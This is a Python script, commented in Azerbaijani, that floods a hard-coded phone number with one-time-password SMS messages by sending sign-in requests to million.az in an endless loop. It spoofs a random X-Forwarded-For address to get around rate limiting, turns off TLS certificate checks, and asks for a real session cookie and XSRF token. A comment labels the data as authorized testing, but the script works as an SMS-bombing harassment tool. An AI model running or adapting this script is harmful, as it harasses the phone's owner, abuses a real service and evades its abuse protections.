import urllib.request
import json
import random
import time
import ssl

# --- SƏLAHİYYƏTLİ TEST MƏLUMATLARI ---
TARGET_PHONE = "508880067" 

# ŞƏKİLDƏ TAPDIĞIN O UZUN KUKİ MƏTNİNİ BURA YAPIŞDIR
REAL_COOKIE = "YOUR_REAL_COOKIE"

# Şəkildə Headers hissəsində əgər 'x-xsrf-token' görsən onu bura yaz, yoxdursa boş saxla
XSRF_TOKEN = ""

def million_ultimate_strike():
    print(f"[!!!] MILLION ULTIMATE SNIPER AKTİVDİR: {TARGET_PHONE}")
    
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    url = "https://www.million.az/api/v1/auth/signin"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "application/json, text/plain, */*",
        "Cookie": REAL_COOKIE,
        "X-XSRF-TOKEN": XSRF_TOKEN,
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://www.million.az",
        "Referer": "https://www.million.az/auth/signin",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }

    payload = json.dumps({
        "msisdn": TARGET_PHONE,
        "rememberMe": True
    }).encode('utf-8')

    while True:
        try:
            req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
            
            with urllib.request.urlopen(req, context=ctx, timeout=12) as resp:
                status = resp.getcode()
                print(f"[HIT] Real Session vasitəsilə OTP göndərildi! Status: {status}")
            
            # Sürətli ardıcıllıq
            time.sleep(random.uniform(0.8, 1.5))

        except Exception as e:
            # Əgər 419 xətası alırsansa, deməli XSRF-TOKEN mütləq lazımdır
            print(f"[BLOK/ERROR] Server xətası və ya Token tələbi: {e}")
            time.sleep(5)

if __name__ == "__main__":
    million_ultimate_strike()
